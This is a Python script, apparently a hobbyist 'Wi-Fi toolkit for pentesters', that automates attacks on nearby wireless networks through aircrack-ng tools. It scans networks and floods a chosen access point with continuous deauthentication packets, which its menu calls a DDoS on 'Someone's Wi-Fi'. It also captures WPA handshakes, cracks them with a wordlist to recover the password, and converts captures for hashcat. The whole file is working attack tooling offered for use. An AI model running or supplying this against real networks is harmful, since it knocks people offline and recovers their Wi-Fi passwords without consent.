import os
import subprocess
import time
import platform
from colorama import Fore, Back, Style, init
import re
import curses



init()


# art
art = """
        ██████  ██████  ██████  ███████ ██████      ██████  ██    ██     ███    ██  ██████   ██ ███████ ███████ 
        ██      ██    ██ ██   ██ ██      ██   ██     ██   ██  ██  ██      ████   ██ ██    ██ ███ ██      ██      
        ██      ██    ██ ██   ██ █████   ██   ██     ██████    ████       ██ ██  ██ ██    ██  ██ ███████ █████   
        ██      ██    ██ ██   ██ ██      ██   ██     ██   ██    ██        ██  ██ ██ ██    ██  ██      ██ ██      
        ██████  ██████  ██████  ███████ ██████      ██████     ██        ██   ████  ██████   ██ ███████ ███████ 
                                                1.0                                                                 
"""

art2 = """
        ██████╗ ██████╗ ██████╗ ███████╗██████╗     ██████╗ ██╗   ██╗    ███╗   ██╗ ██████╗  ██╗███████╗███████╗
        ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝    ████╗  ██║██╔═══██╗███║██╔════╝██╔════╝
        ██║     ██║   ██║██║  ██║█████╗  ██║  ██║    ██████╔╝ ╚████╔╝     ██╔██╗ ██║██║   ██║╚██║███████╗█████╗  
        ██║     ██║   ██║██║  ██║██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝      ██║╚██╗██║██║   ██║ ██║╚════██║██╔══╝  
        ╚██████╗╚██████╔╝██████╔╝███████╗██████╔╝    ██████╔╝   ██║       ██║ ╚████║╚██████╔╝ ██║███████║███████╗
        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═════╝     ╚═════╝    ╚═╝       ╚═╝  ╚═══╝ ╚═════╝  ╚═╝╚══════╝╚══════╝
                                                2.0
"""


# Clear function like always
def clear():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")


#My Amazing intro
def intro():
    clear()
    print(Fore.RED + art)
    time.sleep(0.5)
    clear()
    print(Fore.BLUE + art2)
    time.sleep(0.5)
    clear()
    print(Fore.LIGHTCYAN_EX + art)
    time.sleep(0.5)
    clear()
    print(Fore.LIGHTMAGENTA_EX + art2)         


def install_airmon_ng():
    clear()
    try:
        subprocess.run(["sudo", "apt", "update"], check=True)
        subprocess.run(["sudo", "apt", "install", "-y", "aircrack-ng"], check=True)
        return True
    except subprocess.CalledProcessError:
        clear()
        print(f"{Fore.RED}[✘] Error: Failed to install airmon-ng.")
        time.sleep(2)
        return False

def install_hcxpcapngtool():
    clear()
    try:
        subprocess.run(["sudo", "apt", "update"], check=True)
        subprocess.run(["sudo", "apt", "install", "-y", "hcxtools"], check=True)
        return True
    except subprocess.CalledProcessError:
        clear()
        print(f"{Fore.RED}[✘] Error: Failed to install hcxtools.")
        time.sleep(2)
        return False
        

def check_point_and_monitor_support():
    clear()
    if os.geteuid() == 0:
        print(f"{Fore.GREEN}[✓] Running as root!")
        time.sleep(1)
    else:
        print(f"{Fore.RED}[✘] please run the script as root!")
        exit(1)
    #aircrack-ng
    try:
        subprocess.run(["airmon-ng", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        print(f"{Fore.GREEN}[✓] airmon-ng installed successfully.")
        time.sleep(2)
    except FileNotFoundError:
        clear()
        print(f"{Fore.LIGHTYELLOW_EX}[!] Airmon-ng is not installed. Attempting to automatically install...")
        time.sleep(5)
        if install_airmon_ng():
            try:
                subprocess.run(["airmon-ng", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
                clear()
                print(f"{Fore.GREEN}[✓] airmon-ng installed successfully.")
                time.sleep(2)
                return True  
            except subprocess.CalledProcessError:
                clear()
                print(f"{Fore.RED}[✘] Error: Failed to install airmon-ng.")
                time.sleep(2)
                return False  
        else:
            clear()
            print(f"{Fore.RED}[✘] Error: Failed to install airmon-ng.")
            time.sleep(2)
            return False  
    #hcxpcapngtool
    try:
        subprocess.run(["hcxpcapngtool"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        print(f"{Fore.GREEN}[✓] hcxpcapngtool installed successfully.")
        time.sleep(2)
    except FileNotFoundError:
        clear()
        print(f"{Fore.YELLOW}[!] hcxpcapngtool is not installed. Attempting to automatically install...")
        time.sleep(5)
        if install_hcxpcapngtool():
            try:
                subprocess.run(["hcxpcapngtool"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
                clear()
                print(f"{Fore.GREEN}[✓] hcxpcapngtool installed successfully.")
                time.sleep(2)
                return True
            except subprocess.CalledProcessError:
                clear()
                print(f"{Fore.RED}[✘] Error: Failed to install hcxpcapngtool.")
                time.sleep(2)
                return False
        else:
            clear()
            print(f"{Fore.RED}[✘] Error: Failed to install hcxpcapngtool.")
            time.sleep(2)
            return False
#Check for monitor mode support
    try:
        result = subprocess.run(["airmon-ng", "check", "wlan0"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True, text=True)
        if "monitor mode" in result.stdout:
            print(f"{Fore.GREEN}[✓] Your network interface supports monitor mode.")
            time.sleep(2)
            return True  
        else:
            clear()
            print(f"{Fore.RED}[✘] Your network interface does not support monitor mode.")
            return False  
    except subprocess.CalledProcessError:
        clear()
        print(f"{Fore.RED}[✘] Error: Failed to check if your network interface supports monitor mode.")
        return False  
    



def startup():
    clear()
    print(f"{Fore.LIGHTYELLOW_EX}[!] Putting your network interface into monitor mode...")
    time.sleep(3)
    subprocess.run(["airmon-ng", "check" ,"kill"])
    time.sleep(0.5)
    subprocess.run(["airmon-ng" ,"start" ,"wlan0"])
    clear()




#scanning_on_some_real_shit
def scan_with_curses(stdscr):
    clear()

    curses.curs_set(0)
    stdscr.clear()
    stdscr.refresh()

    curses.init_pair(1, curses.COLOR_CYAN, curses.COLOR_BLACK) 
    curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_YELLOW, curses.COLOR_BLACK)
    

    selected_number = 0

    while True:
        current_networks = []
        try:
            scan_results = subprocess.check_output(['nmcli', '-f', 'SSID,BSSID,CHAN,SIGNAL,SECURITY', 'dev', 'wifi', 'list'])
            scan_results = scan_results.decode('utf-8')
            stdscr.clear()

            stdscr.addstr("[!] Use up and down arrow keys to navigate, then press Enter to select a Target:\n\n", curses.color_pair(3))

            for i, line in enumerate(scan_results.splitlines()[1:], 1):
                parts = line.split()
                if len(parts) >= 5:
                    ssid = parts[0]
                    bssid = parts[1]
                    ch = parts[2]
                    signal = parts[3]
                    security = parts[4]
                    current_networks.append((ssid, bssid, ch, signal, security))
                    encryption = security.split()[0] if security != '--' else "Open"
                    if i - 1 == selected_number:
                        stdscr.addstr(f"{i}. {ssid} (BSSID: {bssid}, Channel: {ch}, Encryption: {encryption})\n", curses.A_REVERSE)
                    else:
                        stdscr.addstr(f"{i}. {ssid} (BSSID: {bssid}, Channel: {ch}, Encryption: {encryption})\n")

            stdscr.refresh()

            key = stdscr.getch()
            if key == curses.KEY_UP:
                if selected_number > 0:
                    selected_number -= 1
            elif key == curses.KEY_DOWN:
                if selected_number < len(current_networks) - 1:
                    selected_number += 1
            elif key == curses.KEY_ENTER or key in [10, 13]:
                selected_network = current_networks[selected_number]
                break
        except KeyboardInterrupt:
            break
    
    return selected_network
#scanning_on_some_real_shit

#A function that took me 2 days to figure out
def check_clients(bssid, ch, ssid):
    clear()
    try:
        command = ['airodump-ng', '--bssid', bssid, '--channel', str(ch), 'wlan0mon']
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        print(f"{Fore.YELLOW}[!] Checking for any clients on {ssid}. Please be patient...")
        time.sleep(5)
        process.terminate()
        output, _ = process.communicate()
        mac_pattern = rf'\b(?!(?:{bssid.replace(":", r":[ :-]*")})\b)([0-9A-Fa-f]{{2}}[:-]){{5}}[0-9A-Fa-f]{{2}}\b'
        clients = re.findall(mac_pattern, output)
        unique_clients = set(clients)
        if unique_clients:
            num_clients = len(unique_clients)
            print(f"{Fore.GREEN}[+] There are {num_clients} client(s) connected to {ssid} network. Moving on...")
            time.sleep(4)
        else:
            clear()
            print(f"{Fore.RED}[-] There are no clients connected to {ssid} network.")
            question = input(f"{Fore.YELLOW}[?] Do you want to continue anyway? (y/n): ")
            if question.lower() == "n":
                subprocess.run(["airmon-ng", "stop", "wlan0mon"])
                subprocess.run(["service", "NetworkManager", "restart"])
                main_menu()
            
    except Exception as e:
        print(f"An error occurred: {e}")
        exit()


def capture_handshake(ssid, bssid, ch):
    try:
        clear()
        print(f"{Fore.GREEN}[+] You selected {ssid}")
        print("")
        print(f"{Fore.GREEN}[+] Trying to capture handshake...")
        #Creating the folder for the handshake
        handshake_folder = "handshakes"
        if not os.path.exists(handshake_folder):
            os.makedirs(handshake_folder)
        #Creating the folder for the handshake
        handshake_file = os.path.join(handshake_folder, f"{ssid}_handshake")
        handshake_command = ["airodump-ng", "wlan0mon", "-c", ch, "--bssid", bssid, "-w", handshake_file, "--output-format", "pcap"]
        handshake_process = subprocess.Popen(handshake_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("")

        handshake_captured = False

        
        print(f"{Fore.GREEN}[+] Trying to kick clients out of {ssid}")
        deauth_command = ["aireplay-ng", "-0", "0", "-a", bssid, "wlan0mon"]
        deauth_process = subprocess.Popen(deauth_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Fore.GREEN}[+] Waiting for handshake capture...")
        time.sleep(2)
        print("")
        while not handshake_captured:
            
            if os.path.exists(handshake_file + "-01.cap"):
                result = subprocess.run(["aircrack-ng", handshake_file + "-01.cap"], capture_output=True, text=True)
                if "WPA (1 handshake)" in result.stdout:
                    handshake_captured = True
                    deauth_process.terminate()
                    print("")
                    print(f"{Fore.GREEN}[✓] Handshake captured and saved as {handshake_file}-01.cap")
                    print(f"{Fore.YELLOW}[?] Would you like to try and crack the handshake now with a common wordlist? (y/n): ")
                    crack_or_not = input().lower()
                    if crack_or_not.lower() == "n":
                        clear()
                        print(f"{Fore.MAGENTA}[+] Bye! Hope you enjoyed, and good luck cracking that handshake :)")
                        print(f"{Fore.RED} https://tryhackme.com/p/no1semyg")
                        exit(0)
                    break
                else:
                    print(f"{Fore.GREEN}[+] Waiting for handshake capture...")
                    print("")
                    print(f"{Fore.YELLOW}[!] Don't quit the script this could take a while...")
                    print("")
                    print(f"{Fore.YELLOW}[!] If you still don't want to wait Press Ctrl+C to quit the script.")
                    time.sleep(3)
                    clear()

                    continue
        handshake_process.terminate()
        handshake_process.wait()
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}[!] Perhaps clients have disconnected from {ssid} network.")
        os.remove(f"{handshake_file}-01.cap")
        exit(0)


    
def crack_handshake(ssid):
    clear()
    handshake_folder = "handshakes"
    handshake_file = os.path.join(handshake_folder, f"{ssid}_handshake")
    wordlist = "no1se.txt"
    print(f"{Fore.GREEN}[+] Attempting to crack the handshake using no1se.txt wordlist...")

    crack_to = ["aircrack-ng", "-w", wordlist, handshake_file + "-01.cap"]

    try:
        with subprocess.Popen(crack_to, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True) as process:
            for line in process.stdout:
                if "KEY FOUND!" in line:
                    key_index = line.index("KEY FOUND!") + len("KEY FOUND!")
                    key = line[key_index:].split()[1]
                    print("")
                    print(f"{Fore.GREEN}[✓] Handshake cracked! The password for {ssid} is:{Fore.WHITE} {key}")
                    input(f"{Fore.YELLOW}[!] Press Enter to quit...")
                    exit()
                elif "Trying key: " in line:
                    key_index = line.index("Trying key: ") + len("Trying key: ")
                    key = line[key_index:].rstrip()
                    print("")
                    print(f"{Fore.YELLOW}[+] Currently Trying: {key}", end='\r')
            print(f"{Fore.RED}[✘] {ssid} Handshake could not be cracked with no1se.txt Sorry, chief, you're on your own...")
            input(f"{Fore.YELLOW}[!] Press Enter to quit...")
            exit()
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED} Error: {e}")



def deauth_attack_G(bssid, ssid, ch):
    try:
        input(f"{Fore.YELLOW}[!] Press Enter to start attacking {ssid}...")
        airodump_command = ["airodump-ng", "--bssid", bssid, "--channel", ch, "wlan0mon"]
        airodump_process = subprocess.Popen(airodump_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        deauth_command = ["aireplay-ng", "-0", "0", "-a", bssid, "wlan0mon"]
        deauth_process = subprocess.Popen(deauth_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        clear()
        print(f"{Fore.GREEN}[+] Started an attack against {ssid}...")
        print("")
        input(f"{Fore.YELLOW}[+] Press Enter to stop the attack...")
        deauth_process.terminate()
        airodump_process.terminate()
        print("")
        print(f"{Fore.GREEN}[+] Attack stopped!")
        subprocess.run(["airmon-ng", "stop", "wlan0mon"])
        subprocess.run(["service", "NetworkManager", "restart"])
        time.sleep(5)
        main_menu()
    except Exception as e:
        print(e)
    

#Did you know that 70% of Israelis use phone numbers as their WiFi passwords?
def pcap_to_hashcat():
    clear()
    while True:
        print(f"{Fore.MAGENTA}[!] Example: /home/user/wifiCapture-01.cap")
        handshake_file = input(f"{Fore.YELLOW}[+] Please Enter the file path for your handshake file: ")
        #checking if the user is smart enough to type the file path
        try:
            with open(handshake_file, 'r') as f:
                break
        except FileNotFoundError:
            print(f"{Fore.RED}[✘] File not found. Please enter a valid file path.")
    
    try:
        clear()
        print(f"{Fore.MAGENTA}[!] Please enter a name without any file extensions, such as .txt, etc.")
        hash_name = input(f"{Fore.YELLOW}[+] How would you like to name your hash file?: ")
        hashcat_folder = "hashcat_cap_files"
        if not os.path.exists(hashcat_folder):
            os.makedirs(hashcat_folder)
        hashcat_save = os.path.join(hashcat_folder, f"{hash_name}.txt")
        hcx_command = ["hcxpcapngtool", handshake_file, "-o", hashcat_save]
        hcx_process = subprocess.run(hcx_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        print(f"{Fore.YELLOW}[+] Converting File...")
        time.sleep(3)
        print("")
        print(f"{Fore.GREEN}[✓] {handshake_file} successfully converted and saved in {hashcat_save}")
        time.sleep(5)
    except Exception as e:
        print(e)
        exit()



        
def main_menu():
    while True:
        #Squidward
        clear()
        print("        .--'''''''''--.  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠃⠀⠀⠀⠀⠀⠀⠰⣶⡀⠀⠀")
        print("     .'      .---.      '.⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠁⣴⠇⠀⠀⠀⠀⠸⣦⠈⢿⡄⠀")
        print("    /    .-----------.    \'⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⢸⡏⢰⡇⠀⠀⢸⡆⢸⡆⢸⡇⠀")
        print("   /        .-----.        \'⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠘⣧⡈⠃⢰⡆⠘⢁⣼⠁⣸⡇⠀")
        print("   |       .-.   .-.       |⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠈⢿⣄⠘⠃⠀⢸⡇⠀⠘⠁⣰⡟⠀⠀")
        print("   |      /   \ /   \      |⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠃⠀⠀⢸⡇⠀⠀⠘⠋⠀⠀⠀")
        print("    \    | .-. | .-. |    /⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀")
        print("     '-._| | | | | | |_.-'⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀")
        print("         | '-' | '-' |⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   ⠘⠃⠀⠀⠀⠀⠀⠀⠀")
        print("          \___/ \___/⠀            ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀")
        print("       _.-'  /   \  `-._⠀         ⢸⣿⣟⠉⢻⡟⠉⢻⡟⠉⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀")
        print("     .' _.--|     |--._ '.⠀       ⢸⣿⣿⣷⣿⣿⣶⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀")
        print("     ' _...-|     |-..._ '        ⠈⠉⠉⢉⣉⣉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣉⣉⡉⠉⠉⠁⠀")
        print("            |     |                ⠀⠀⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀")
        print("            '.___.'")
        #Squidward
        print(Fore.RED+"Welcome to no1seWIFI - Wifi Toolkit for Pentesters.")
        print(Fore.LIGHTYELLOW_EX+"Please select an option:")
        print(f"{Fore.WHITE}1. Begin WPA Handshake attack.{Style.RESET_ALL}")
        print(f"{Fore.WHITE}2. Start a Deauth Attack on Someone's Wi-Fi (DDoS Attack)")
        print(f"{Fore.WHITE}3. Convert a handshake capture file into a format compatible with hashcat.")
        print(f"{Fore.WHITE}4. Exit{Style.RESET_ALL}")
        choice = input(f"{Fore.LIGHTBLUE_EX}Enter your choice:{Fore.WHITE} ")
        
        if choice == "1":
            if check_point_and_monitor_support():
                #----------------------------------
                try:
                    try:
                        selected_network = curses.wrapper(scan_with_curses)
                    except Exception as e:
                        print(f"{Fore.RED}[✘] Please maximize your terminal and run the script again. ensure it remains in this state.")
                        print(f"{Fore.RED}[✘] Please maximize your terminal and run the script again. ensure it remains in this state.")
                        print(f"{Fore.RED}[✘] Please maximize your terminal and run the script again. ensure it remains in this state.")
                        return False

                    startup()
                    if selected_network:
                        ssid, bssid, ch, _, _ = selected_network
                        check_clients(bssid, ch, ssid)
                        capture_handshake(ssid, bssid, ch)
                        crack_handshake(ssid)
                except KeyboardInterrupt:
                    print("https://www.youtube.com/watch?v=rgbi4F3mEXc")
                finally:
                    subprocess.run(["airmon-ng", "stop", "wlan0mon"])
                    subprocess.run(["service", "NetworkManager", "restart"])
                    print(f"{Fore.LIGHTYELLOW_EX}[!] Detected script exit...")
                    print(f"{Fore.LIGHTYELLOW_EX}[!] I got you homie network is back!")
                    exit(1)
            else:
                print("https://www.youtube.com/watch?v=rgbi4F3mEXc")
                exit(1)
        elif choice == "2":
            if check_point_and_monitor_support():
                #----------------------------------
                try:
                    try:
                        selected_network = curses.wrapper(scan_with_curses)
                    except Exception as e:
                        print(f"{Fore.RED}[✘] Please maximize your terminal and run the script again. ensure it remains in this state.")
                        print(f"{Fore.RED}[✘] Please maximize your terminal and run the script again. ensure it remains in this state.")
                        print(f"{Fore.RED}[✘] Please maximize your terminal and run the script again. ensure it remains in this state.")
                        exit()

                    startup()
                    if selected_network:
                        ssid, bssid, ch, _, _ = selected_network
                        deauth_attack_G(bssid,ssid, ch)
                except KeyboardInterrupt:
                    print("https://www.youtube.com/watch?v=rgbi4F3mEXc")
                finally:
                    subprocess.run(["airmon-ng", "stop", "wlan0mon"])
                    subprocess.run(["service", "NetworkManager", "restart"])
                    print(f"{Fore.LIGHTYELLOW_EX}[!] Detected script exit...")
                    print(f"{Fore.LIGHTYELLOW_EX}[!] I got you homie network is back!")
                    exit(1)
            else:
                print("https://www.youtube.com/watch?v=rgbi4F3mEXc")
                exit(1)

        elif choice == "3":
            if check_point_and_monitor_support():
                #----------------------------------
                pcap_to_hashcat()

        elif choice == "4":
            print(f"{Fore.LIGHTYELLOW_EX}Bye! :(")
            exit(1)
        else:
            print("")
            print(f"{Fore.RED}Please select a valid option!")
            time.sleep(2)
        

intro()
main_menu()